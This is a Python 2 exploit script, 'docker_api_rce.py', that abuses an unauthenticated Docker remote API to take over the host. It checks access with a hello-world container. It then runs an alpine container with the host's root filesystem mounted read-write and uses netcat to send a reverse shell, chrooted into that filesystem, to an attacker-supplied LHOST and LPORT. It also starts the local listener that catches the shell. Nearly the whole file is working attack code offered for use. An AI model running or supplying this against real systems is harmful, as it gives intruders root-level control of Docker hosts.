#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#·▄▄▄▄         ▄▄· ▄ •▄ ▄▄▄ .▄▄▄   ▄▄▄·  ▄▄▄·▪  ▄▄▄   ▄▄· ▄▄▄ .                                             #
#██▪ ██ ▪     ▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·▐█ ▀█ ▐█ ▄███ ▀▄ █·▐█ ▌▪▀▄.▀·                                             #
#▐█· ▐█▌ ▄█▀▄ ██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ ▄█▀▀█  ██▀·▐█·▐▀▀▄ ██ ▄▄▐▀▀▪▄                                             #
#██. ██ ▐█▌.▐▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌▐█ ▪▐▌▐█▪·•▐█▌▐█•█▌▐███▌▐█▄▄▌                                             #
#▀▀▀▀▀•  ▀█▄▀▪·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀ ▀  ▀ .▀   ▀▀▀.▀  ▀·▀▀▀  ▀▀▀                                              #
# docker_api_rce.py - nighter                                                                               #
#                                                                                                           #
# DATE                                                                                                      #
# 02/10/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# If we have remote access to the docker api we can abuse it to pop shell                                   #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################

import docker
import signal
import sys
import os
import time

from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def is_vulnerable():

    client = docker.DockerClient(base_url=URL)
    data = client.containers.run('hello-world', r''' ''', remove=True)
    if 'This message shows that your installation appears to be working correctly.' in data:
        return True
    else:
        return False


def exploit():

    if is_vulnerable() is True:
        print("[+] %s Vulnerable" % URL)
    else:
        print("[-] %s Not vulnerable" % URL)
        sys.exit(0)

    time.sleep(3)
    print("[+] Exploit")
    client = docker.DockerClient(base_url=URL)
    client.containers.run('alpine:latest', r'''sh -c "/usr/bin/nc %s %s -e /bin/sh -c 'chroot /mnt'" ''' % (LHOST, LPORT), remove=True, volumes={'/': {'bind': '/mnt', 'mode': 'rw'}})


if __name__ == '__main__':

    try:
        URL = sys.argv[1]
        if sys.argv[2].lower() == 'check':
            if is_vulnerable() is True:
                print("[+] %s Vulnerable" % URL)
                os._exit(0)
            else:
                print("[-] %s Not vulnerable" % URL)
                os._exit(0)
    except:
        pass

    if len(sys.argv) != 4:
        print("""
·▄▄▄▄         ▄▄· ▄ •▄ ▄▄▄ .▄▄▄   ▄▄▄·  ▄▄▄·▪  ▄▄▄   ▄▄· ▄▄▄ .
██▪ ██ ▪     ▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·▐█ ▀█ ▐█ ▄███ ▀▄ █·▐█ ▌▪▀▄.▀·
▐█· ▐█▌ ▄█▀▄ ██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ ▄█▀▀█  ██▀·▐█·▐▀▀▄ ██ ▄▄▐▀▀▪▄
██. ██ ▐█▌.▐▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌▐█ ▪▐▌▐█▪·•▐█▌▐█•█▌▐███▌▐█▄▄▌
▀▀▀▀▀•  ▀█▄▀▪·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀ ▀  ▀ .▀   ▀▀▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    """)
        print "Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0])
        print "\nEXAMPLE: ./docker_api_rce.py 'http://0.0.0.0:2375/' check"
        print "EXAMPLE: ./docker_api_rce.py 'http://0.0.0.0:2375/' 10.10.14.24 1337\n"
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print "[+] LHOST = %s" % LHOST
    print "[+] LPORT = %s" % LPORT

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    # Start listener
    print("[+] Shell listen")
    os.system('nc -lnvp %s' % LPORT)

